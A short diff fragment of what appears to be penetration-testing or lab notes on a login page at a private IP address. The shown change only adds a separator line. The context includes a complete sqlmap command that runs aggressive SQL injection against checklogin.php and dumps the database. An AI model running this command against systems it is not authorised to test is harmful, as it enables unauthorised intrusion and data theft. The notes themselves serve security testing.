@@ -12,7 +12,7 @@ URL changes to http://192.168.32.49/checklogin.php
 
 ///////////////////
 SQLmap
-
+///////////////////
 COMMAND USED
 sqlmap -u "http://192.168.32.49/checklogin.php" --dbms=MySQL --level=5 --risk=3 --data="myusername=admin&mypassword=test" --dump
 
